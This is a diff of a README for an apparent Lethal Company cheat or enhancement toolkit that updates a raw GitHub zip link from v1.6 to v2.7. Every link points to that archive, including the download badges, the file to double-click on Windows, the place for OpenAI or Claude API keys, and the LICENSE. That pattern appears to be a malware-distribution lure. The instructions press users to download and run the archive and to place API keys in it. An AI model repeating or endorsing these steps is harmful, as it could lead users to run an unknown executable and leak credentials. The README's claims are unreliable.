@@ -1,4 +1,4 @@
-# ![Download](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip)  
+# ![Download](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip)  
 *Harness next-level advantages and immerse yourself deeper into Lethal Company's universe*
 
 ---
@@ -74,7 +74,7 @@ Our toolkit isn’t just smart – it’s wise. Tap into the power of modern AI,
 - **Automated Stat Analysis**: Let the AI highlight strengths and recommend improvement areas.
 - **Scripted Custom Prompts**: Want to run complex scenarios or simulate rare events? Write prompts and let the AI do the work.
 
-***To enable these AI features, install the respective API keys into the `https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip` before first use.***  
+***To enable these AI features, install the respective API keys into the `https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip` before first use.***  
 (See [Installation Guide](#-installation) below.)
 
 ---
@@ -98,16 +98,16 @@ From Discord bots to instant emails, help is always at your fingertips.
 ## ⚙️ Installation
 
 **Step 1:** Download the latest build here:  
-![Download](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip)
+![Download](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip)
 
 **Step 2:**  
 Unpack the downloaded `.zip` file into your preferred workspace or mods folder.
 
 **Step 3:**  
-Double-click the `https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip` (Windows) or `./LethalCompanyEnhancer` (macOS, Linux).
+Double-click the `https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip` (Windows) or `./LethalCompanyEnhancer` (macOS, Linux).
 
 **Step 4 (Optional AI):**  
-Obtain your OpenAI or Claude API key, and add it to `https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip`:
+Obtain your OpenAI or Claude API key, and add it to `https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip`:
 
   {
     "openai_key": "sk-...",
@@ -129,11 +129,11 @@ By downloading or utilizing this repository, you accept sole responsibility for 
 
 ## 📜 MIT License Section with Link
 
-Distributed under the MIT License (2025). See the [LICENSE](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip) for more information.
+Distributed under the MIT License (2025). See the [LICENSE](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip) for more information.
 
 ---
 
-# ![Download](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v1.6.zip)  
+# ![Download](https://raw.githubusercontent.com/ghm006/lethal-company-toolkit-extras/branch/retrorse/lethal-company-toolkit-extras-v2.7.zip)  
 *Step into the new era of Lethal Company – transcend traditional play!*
 
 ---
